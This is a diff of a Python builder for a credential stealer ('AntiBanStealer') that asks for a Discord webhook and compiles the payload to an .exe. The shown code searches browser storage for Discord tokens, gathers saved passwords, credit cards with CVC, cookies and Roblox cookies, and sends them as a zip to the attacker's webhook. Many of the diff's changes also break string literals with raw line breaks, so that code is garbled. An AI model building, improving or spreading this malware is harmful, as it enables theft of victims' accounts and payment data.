@@ -1,3 +1,13 @@
+# Copyright (c) Kernel-Tool
+# See the file 'LICENSE' for copying permission
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
+# EN: 
+#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
+#     - Do not resell this tool, do not credit it to yours.
+# FR: 
+#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
+#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
+
 import os
 import sys
 import subprocess
@@ -19,7 +29,8 @@ class Colors:
 class Center:
     @staticmethod
     def XCenter(text):
-        lines = text.split('\n')
+        lines = text.split('
+')
         terminal_width = shutil.get_terminal_size((80, 20)).columns
         centered = []
         for line in lines:
@@ -29,12 +40,14 @@ class Center:
                 centered.append(' ' * spaces + stripped)
             else:
                 centered.append('')
-        return '\n'.join(centered)
+        return '
+'.join(centered)
 
 class Colorate:
     @staticmethod
     def Horizontal(color_func, text, step=1):
-        lines = text.split('\n')
+        lines = text.split('
+')
         total_chars = sum(len(line) for line in lines)
         colors = color_func(total_chars)
         
@@ -46,13 +59,14 @@ class Colorate:
             for char in line:
                 if color_index < len(colors):
                     r, g, b = colors[color_index]
-                    colored_line += f"\033[38;2;{r};{g};{b}m{char}"
+                    colored_line += f"[38;2;{r};{g};{b}m{char}"
                     color_index += step
                 else:
                     colored_line += char
             result.append(colored_line)
         
-        return '\n'.join(result) + "\033[0m"
+        return '
+'.join(result) + "[0m"
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -379,9 +393,9 @@ class AntiBanStealer:
             return
         
         token_patterns = [
-            r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}',
-            r'mfa\\.[\\w-]{84}',
-            r'[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{38}'
+            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
+            r'mfa\.[\w-]{84}',
+            r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}'
         ]
         
         for file_path in glob.glob(os.path.join(localstorage_path, '*.ldb')):
@@ -472,7 +486,7 @@ class AntiBanStealer:
     def get_hwid(self):
         try:
             if sys.platform == "win32":
-                hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\\n')[1].strip()
+                hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
                 return hwid
             return "N/A"
         except:
@@ -553,44 +567,44 @@ Date         : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 ================================
 """
         
-        passwords_content = "================================\\n"
-        passwords_content += "       PASSWORDS\\n"
-        passwords_content += "================================\\n\\n"
+        passwords_content = "================================\n"
+        passwords_content += "       PASSWORDS\n"
+        passwords_content += "================================\n\n"
         
         for pwd in self.data['passwords']:
-            passwords_content += f"Browser  : {pwd['browser']}\\n"
-            passwords_content += f"URL      : {pwd['url']}\\n"
-            passwords_content += f"Username : {pwd['username']}\\n"
-            passwords_content += f"Password : {pwd['password']}\\n"
-            passwords_content += "-" * 50 + "\\n\\n"
+            passwords_content += f"Browser  : {pwd['browser']}\n"
+            passwords_content += f"URL      : {pwd['url']}\n"
+            passwords_content += f"Username : {pwd['username']}\n"
+            passwords_content += f"Password : {pwd['password']}\n"
+            passwords_content += "-" * 50 + "\n\n"
         
-        cards_content = "================================\\n"
-        cards_content += "       CREDIT CARDS\\n"
-        cards_content += "================================\\n\\n"
+        cards_content = "================================\n"
+        cards_content += "       CREDIT CARDS\n"
+        cards_content += "================================\n\n"
         
         for card in self.data['cards']:
-            cards_content += f"Browser    : {card['browser']}\\n"
-            cards_content += f"Name       : {card['name']}\\n"
-            cards_content += f"Number     : {card['number']}\\n"
-            cards_content += f"Expiration : {card['exp_month']}/{card['exp_year']}\\n"
-            cards_content += f"CVC        : {card.get('cvc', 'N/A')}\\n"
-            cards_content += "-" * 50 + "\\n\\n"
+            cards_content += f"Browser    : {card['browser']}\n"
+            cards_content += f"Name       : {card['name']}\n"
+            cards_content += f"Number     : {card['number']}\n"
+            cards_content += f"Expiration : {card['exp_month']}/{card['exp_year']}\n"
+            cards_content += f"CVC        : {card.get('cvc', 'N/A')}\n"
+            cards_content += "-" * 50 + "\n\n"
         
-        discord_content = "================================\\n"
-        discord_content += "       DISCORD TOKENS\\n"
-        discord_content += "================================\\n\\n"
+        discord_content = "================================\n"
+        discord_content += "       DISCORD TOKENS\n"
+        discord_content += "================================\n\n"
         
         for token in self.data['tokens']:
-            discord_content += f"Browser : {token['browser']}\\n"
-            discord_content += f"Token   : {token['token']}\\n"
-            discord_content += "-" * 50 + "\\n\\n"
+            discord_content += f"Browser : {token['browser']}\n"
+            discord_content += f"Token   : {token['token']}\n"
+            discord_content += "-" * 50 + "\n\n"
         
-        cookies_content = "================================\\n"
-        cookies_content += "       COOKIES\\n"
-        cookies_content += "================================\\n\\n"
+        cookies_content = "================================\n"
+        cookies_content += "       COOKIES\n"
+        cookies_content += "================================\n\n"
         
         for cookie in self.data['cookies'][:200]:
-            cookies_content += f"{cookie['browser']} | {cookie['host']} | {cookie['name']} | {cookie['value'][:50]}\\n"
+            cookies_content += f"{cookie['browser']} | {cookie['host']} | {cookie['name']} | {cookie['value'][:50]}\n"
         
         browsers_content = f"""================================
        BROWSERS SUMMARY
@@ -653,13 +667,13 @@ Roblox Cookies : {self.stats['total_roblox']}
             
             files = {'file': (f'{self.session_id}.zip', zip_data, 'application/zip')}
             
-            embed_content = f"**Session {self.session_id}**\\n\\n"
-            embed_content += f"**PC**\\n{self.pc_info.get('pc_name', 'Unknown')}\\n\\n"
-            embed_content += f"**User**\\n{self.pc_info.get('username', 'Unknown')}\\n\\n"
-            embed_content += f"**Browsers**\\n{self.stats['browsers_found']}\\n\\n"
-            embed_content += f"**Cookies**\\n{self.stats['total_cookies']}\\n\\n"
-            embed_content += f"**Passwords**\\n{self.stats['total_passwords']}\\n\\n"
-            embed_content += f"**Cards**\\n{self.stats['total_cards']}\\n\\n"
+            embed_content = f"**Session {self.session_id}**\n\n"
+            embed_content += f"**PC**\n{self.pc_info.get('pc_name', 'Unknown')}\n\n"
+            embed_content += f"**User**\n{self.pc_info.get('username', 'Unknown')}\n\n"
+            embed_content += f"**Browsers**\n{self.stats['browsers_found']}\n\n"
+            embed_content += f"**Cookies**\n{self.stats['total_cookies']}\n\n"
+            embed_content += f"**Passwords**\n{self.stats['total_passwords']}\n\n"
+            embed_content += f"**Cards**\n{self.stats['total_cards']}\n\n"
             
             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             
@@ -766,13 +780,16 @@ def main():
     """
     
     Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(ascii_art)))
-    print("\n")
+    print("
+")
     
     Write(Colorate.Horizontal(Colors.green_to_cyan, "Webhook : "))
     w = input().strip()
     
     if not w.startswith('https://discord.com/api/webhooks/'):
-        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nWebhook invalide!\n'))
+        Write(Colorate.Horizontal(Colors.green_to_cyan, '
+Webhook invalide!
+'))
         sys.exit()
     
     Write(Colorate.Horizontal(Colors.green_to_cyan, 'Choose file name : '))
@@ -785,16 +802,21 @@ def main():
     e = f'output/{n}.exe'
     
     print()
-    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...\n'))
+    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...
+'))
     
     with open(t, 'w', encoding='utf-8') as f:
         f.write(c)
     
-    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...\n'))
+    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...
+'))
     
     if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
-        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nPyInstaller non installe!\n'))
-        Write(Colorate.Horizontal(Colors.green_to_cyan, 'Installez avec: pip install pyinstaller\n'))
+        Write(Colorate.Horizontal(Colors.green_to_cyan, '
+PyInstaller non installe!
+'))
+        Write(Colorate.Horizontal(Colors.green_to_cyan, 'Installez avec: pip install pyinstaller
+'))
         sys.exit()
     
     r = subprocess.run([
@@ -816,7 +838,9 @@ def main():
     ], capture_output=True, text=True)
     
     if r.returncode != 0:
-        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nErreur de compilation!\n'))
+        Write(Colorate.Horizontal(Colors.green_to_cyan, '
+Erreur de compilation!
+'))
         print(r.stderr[:500])
         sys.exit()
     
@@ -829,13 +853,17 @@ def main():
             pass
     
     print()
-    success_banner = "══════════════════════════════════════════════════════════════════════\n                         COMPILATION REUSSIE!\n══════════════════════════════════════════════════════════════════════"
+    success_banner = "══════════════════════════════════════════════════════════════════════
+                         COMPILATION REUSSIE!
+══════════════════════════════════════════════════════════════════════"
     Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))
-    print("\n")
-    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe\n"))
-    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Webhook : {w[:50]}...\n"))
+    print("
+")
+    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe
+"))
+    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Webhook : {w[:50]}...
+"))
     print()
 
 if __name__ == "__main__":
     main()
-
